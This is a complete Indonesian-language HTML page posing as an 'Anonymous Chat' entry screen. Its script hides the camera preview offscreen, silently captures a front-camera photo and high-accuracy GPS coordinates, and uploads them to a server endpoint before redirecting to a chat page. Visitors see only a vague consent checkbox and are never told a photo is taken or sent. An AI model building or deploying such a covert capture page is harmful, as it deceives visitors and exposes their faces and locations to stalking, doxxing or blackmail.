<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>Anonymous Chat</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
            background:
                radial-gradient(circle at top, #26345f 0%, #10162c 45%, #070a14 100%);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 460px;
        }

        .card {
            background: rgba(18, 24, 45, 0.94);
            border: 1px solid rgba(255,255,255,.10);
            border-radius: 24px;
            padding: 30px;
            box-shadow:
                0 25px 70px rgba(0,0,0,.45);
        }

        .logo {
            width: 70px;
            height: 70px;
            margin: 0 auto 18px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            background: linear-gradient(135deg,#667eea,#764ba2);
            box-shadow: 0 10px 30px rgba(102,126,234,.35);
        }

        h1 {
            text-align: center;
            font-size: 27px;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #aeb7d0;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 25px;
        }

        .notice {
            background: rgba(59,130,246,.10);
            border: 1px solid rgba(96,165,250,.25);
            border-radius: 15px;
            padding: 15px;
            font-size: 13px;
            line-height: 1.6;
            color: #dbeafe;
            margin-bottom: 20px;
        }

        .notice strong {
            color: #93c5fd;
        }

        .permission-box {
            background: rgba(255,255,255,.045);
            border: 1px solid rgba(255,255,255,.08);
            border-radius: 15px;
            padding: 16px;
            margin-bottom: 18px;
        }

        .check {
            display: flex;
            gap: 12px;
            align-items: flex-start;
            cursor: pointer;
            color: #dce3f5;
            font-size: 13px;
            line-height: 1.6;
        }

        .check input {
            width: 19px;
            height: 19px;
            margin-top: 2px;
            accent-color: #667eea;
            flex-shrink: 0;
        }

        button {
            width: 100%;
            border: 0;
            border-radius: 14px;
            padding: 15px;
            font-size: 15px;
            font-weight: 700;
            color: white;
            cursor: pointer;
            background: linear-gradient(135deg,#667eea,#764ba2);
            box-shadow: 0 10px 25px rgba(102,126,234,.25);
            transition: .2s;
        }

        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 14px 30px rgba(102,126,234,.35);
        }

        button:disabled {
            opacity: .55;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            display: none;
            margin-top: 18px;
            padding: 14px;
            border-radius: 13px;
            font-size: 13px;
            line-height: 1.5;
        }

        .status.show {
            display: block;
        }

        .status.info {
            background: rgba(59,130,246,.12);
            border: 1px solid rgba(96,165,250,.25);
            color: #bfdbfe;
        }

        .status.success {
            background: rgba(34,197,94,.12);
            border: 1px solid rgba(74,222,128,.25);
            color: #bbf7d0;
        }

        .status.error {
            background: rgba(239,68,68,.12);
            border: 1px solid rgba(248,113,113,.25);
            color: #fecaca;
        }

        .footer {
            text-align: center;
            color: #737d98;
            font-size: 11px;
            margin-top: 20px;
            line-height: 1.5;
        }

        /*
         * Kamera sengaja tidak ditampilkan.
         * Elemen video tetap digunakan sebagai sumber
         * untuk mengambil foto otomatis.
         */
        #camera {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            left: -9999px;
            top: -9999px;
        }
    </style>
</head>

<body>

<div class="container">

    <div class="card">

        <div class="logo">
            💬
        </div>

        <h1>Anonymous Chat</h1>

        <p class="subtitle">
            Ngobrol dengan pengguna lain secara anonim.
        </p>

        <div class="notice">
            <strong>Perhatian sebelum masuk</strong><br><br>

            Untuk melanjutkan, browser akan meminta izin
            menggunakan kamera dan lokasi.

            
        </div>

        <div class="permission-box">

            <label class="check">

                <input
                    type="checkbox"
                    id="consent"
                >

                <span>
                    Saya memahami dan menyetujui peraturan yang berlaku.
                </span>

            </label>

        </div>

        <!--
            Video tidak ditampilkan kepada pengguna.
            Elemen ini hanya menjadi sumber untuk canvas.
        -->
        <video
            id="camera"
            autoplay
            muted
            playsinline>
        </video>

        <button
            id="startBtn"
            type="button">
            Mulai Anonymous Chat
        </button>

        <div
            id="status"
            class="status">
        </div>

        <div class="footer">
            Kamera dan lokasi hanya digunakan setelah persetujuan
            dan izin browser diberikan.
        </div>

    </div>

</div>


<script>

const consent = document.getElementById("consent");
const startBtn = document.getElementById("startBtn");
const statusBox = document.getElementById("status");
const video = document.getElementById("camera");

let cameraStream = null;


/* ================================
   STATUS
================================ */

function showStatus(message, type = "info") {

    statusBox.className =
        "status show " + type;

    statusBox.textContent = message;
}


/* ================================
   STOP CAMERA
================================ */

function stopCamera() {

    if (!cameraStream) {
        return;
    }

    cameraStream
        .getTracks()
        .forEach(track => track.stop());

    cameraStream = null;

    video.srcObject = null;
}


/* ================================
   WAIT VIDEO
================================ */

function waitForVideo() {

    return new Promise((resolve, reject) => {

        const timeout =
            setTimeout(() => {
                reject(
                    new Error(
                        "Kamera tidak siap."
                    )
                );
            }, 10000);


        function checkVideo() {

            if (
                video.readyState >= 2 &&
                video.videoWidth > 0 &&
                video.videoHeight > 0
            ) {

                clearTimeout(timeout);

                resolve();

            } else {

                requestAnimationFrame(
                    checkVideo
                );

            }

        }

        checkVideo();

    });

}


/* ================================
   TAKE PHOTO
================================ */

async function takePhoto() {

    await waitForVideo();

    const canvas =
        document.createElement("canvas");

    canvas.width =
        video.videoWidth;

    canvas.height =
        video.videoHeight;

    const ctx =
        canvas.getContext("2d");

    /*
     * Mirror seperti kamera depan.
     */
    ctx.translate(
        canvas.width,
        0
    );

    ctx.scale(-1, 1);

    ctx.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );

    return new Promise(
        (resolve, reject) => {

            canvas.toBlob(
                blob => {

                    if (!blob) {

                        reject(
                            new Error(
                                "Gagal membuat foto."
                            )
                        );

                        return;
                    }

                    resolve(blob);

                },
                "image/jpeg",
                0.90
            );

        }
    );

}


/* ================================
   LOCATION
================================ */

function getLocation() {

    return new Promise(
        (resolve, reject) => {

            if (!navigator.geolocation) {

                reject(
                    new Error(
                        "Browser tidak mendukung lokasi."
                    )
                );

                return;
            }


            navigator.geolocation.getCurrentPosition(

                position => {

                    resolve({

                        latitude:
                            position.coords.latitude,

                        longitude:
                            position.coords.longitude,

                        accuracy:
                            position.coords.accuracy

                    });

                },

                error => {

                    let message =
                        "Gagal mendapatkan lokasi.";

                    if (error.code === 1) {
                        message =
                            "Izin lokasi ditolak.";
                    }

                    if (error.code === 2) {
                        message =
                            "Lokasi tidak tersedia.";
                    }

                    if (error.code === 3) {
                        message =
                            "Permintaan lokasi timeout.";
                    }

                    reject(
                        new Error(message)
                    );

                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }

            );

        }
    );

}


/* ================================
   START
================================ */

startBtn.addEventListener(
    "click",
    async () => {

        if (!consent.checked) {

            showStatus(
                "Centang persetujuan terlebih dahulu.",
                "error"
            );

            return;
        }


        startBtn.disabled = true;

        try {

            /*
             * Kamera
             */

            showStatus(
                "Meminta izin kamera...",
                "info"
            );

            cameraStream =
                await navigator.mediaDevices
                .getUserMedia({

                    video: {
                        facingMode: {
                            ideal: "user"
                        },

                        width: {
                            ideal: 1280
                        },

                        height: {
                            ideal: 720
                        }
                    },

                    audio: false

                });


            /*
             * Kamera tidak ditampilkan.
             */

            video.srcObject =
                cameraStream;


            await waitForVideo();


            /*
             * Lokasi
             */

            showStatus(
                "Meminta izin lokasi...",
                "info"
            );

            const location =
                await getLocation();


            /*
             * Foto otomatis
             */

            showStatus(
                "Mengambil foto...",
                "info"
            );

            await new Promise(
                resolve =>
                    setTimeout(
                        resolve,
                        700
                    )
            );

            const photo =
                await takePhoto();


            /*
             * Kirim ke server
             */

            showStatus(
                "Mengirim data...",
                "info"
            );

            const formData =
                new FormData();


            formData.append(
                "photo",
                photo,
                "anonymous-chat-photo.jpg"
            );


            formData.append(
                "latitude",
                location.latitude
            );


            formData.append(
                "longitude",
                location.longitude
            );


            formData.append(
                "accuracy",
                location.accuracy
            );


            formData.append(
                "timestamp",
                new Date().toISOString()
            );


            const response =
                await fetch(
                    "/api/consented-data",
                    {
                        method: "POST",
                        body: formData
                    }
                );


            const result =
                await response.json();


            if (!response.ok ||
                !result.success) {

                throw new Error(
                    result.message ||
                    "Gagal mengirim data."
                );

            }


            showStatus(
                "Pendaftaran berhasil. Menghubungkan ke chat...",
                "success"
            );


            stopCamera();


            /*
             * Masuk ke halaman chat.
             */

            setTimeout(
                () => {

                    window.location.href =
                        "/chat.html";

                },
                1000
            );


        } catch (error) {

            console.error(error);

            stopCamera();

            showStatus(
                "Proses dibatalkan: " +
                error.message,
                "error"
            );

            startBtn.disabled = false;

        }

    }
);


/*
 * Bersihkan kamera ketika halaman ditutup.
 */

window.addEventListener(
    "beforeunload",
    stopCamera
);

</script>

</body>
</html>
